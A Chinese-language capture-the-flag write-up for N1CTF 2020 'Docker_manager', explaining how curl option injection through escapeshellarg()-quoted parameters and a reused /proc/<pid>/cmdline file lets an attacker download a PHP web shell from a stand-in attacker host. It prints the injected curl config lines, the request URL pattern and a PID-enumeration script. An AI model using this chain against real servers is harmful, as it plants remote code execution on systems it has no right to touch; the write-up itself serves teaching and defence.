# N1CTF 2020 Docker_manager Writeup

## 题目简述

题目提供一个 PHP 编写的 Docker API 查看器。`view.php` 接收 `host`、`cert`、`key`、`cacert` 和 `mode`，分别经过 `escapeshellarg()` 后拼入 `curl` 命令。容器中 `/var/www/html/img` 可写。表面上参数已经被 shell 转义，实际漏洞发生在 `curl` 自身的参数解析：攻击者能让 `host` 变成 `-K` 配置文件选项，再把当前进程的 `/proc/<pid>/cmdline` 当成配置文件，实现任意 URL 下载和文件写入。

## 解题过程

### 从 URL 参数逃逸到 curl 参数

程序构造的命令可概括为：

```php
curl --connect-timeout 10 <host> -g --cert=<cert> --key=<key> --cacert=<cacert>
```

`escapeshellarg()` 只能阻止 shell 注入，不能阻止被调用程序把一个参数解释为选项。部署所用 PHP/curl 组合允许 `%00` 截断后续内容，因此可把 `host` 设为：

```text
-K/dev/urandom%00
```

`-K` 要求 curl 持续读取配置文件；`/dev/urandom` 不会到达 EOF，于是该 curl 进程长期存活，给攻击者留下读取其 `/proc/<pid>/cmdline` 的时间窗口。

### 把命令行伪装成 curl 配置文件

其他可控参数会按顺序出现在 NUL 分隔的 `cmdline` 中。通过在 `cacert` 等字段中加入换行，可以让其中一段同时满足 curl 配置语法：

```text
url="https://attacker.example/shell.txt"
output="img/shell.php"
```

第一条请求使用 `-K /dev/urandom` 挂住进程并把上述文本留在命令行。随后枚举较小的 PID 范围，对每个候选发起：

```text
/view.php?host=-K/proc/<pid>/cmdline%00
```

命中前一个存活进程时，新启动的 curl 会把其 `cmdline` 当配置文件解析，从攻击者地址下载 PHP 载荷，并写入可写的 `img/shell.php`。

```python
import requests

base = "http://target/view.php?host=-K/proc/{}/cmdline%00"
for pid in range(1, 100):
    response = requests.get(base.format(pid), timeout=3)
    print(pid, response.status_code, response.text[:80])
```

### 执行 readflag

访问写入的 PHP 文件即可执行命令。容器中的 `/readflag` 会设置限时数学问答；取得交互 shell 后可先忽略对应的闹钟信号，再运行程序并作答：

```bash
trap '' 14
/readflag
```

这一步只是取 flag 的交互限制，真正的 Web 漏洞仍是“应用参数安全”与“curl 参数安全”之间的语义落差。赛后公开的 [DockerManager 复现记录](https://www.zhaoj.in/read-6750.html) 包含原始请求样例；上文已经归纳了其全部关键机制。

## 方法总结

`escapeshellarg()` 并不等于命令调用安全：它保护的是 shell 语法，而不是目标程序的选项解析。任何用户输入只要位于命令行参数位置，都要额外考虑 `--config`、`--output`、`--upload-file` 等“参数注入”。`/proc/<pid>/cmdline` 还可能把一次请求的参数变成第二个进程可消费的数据文件，这类跨进程重解释是本题最关键的思维跳转。
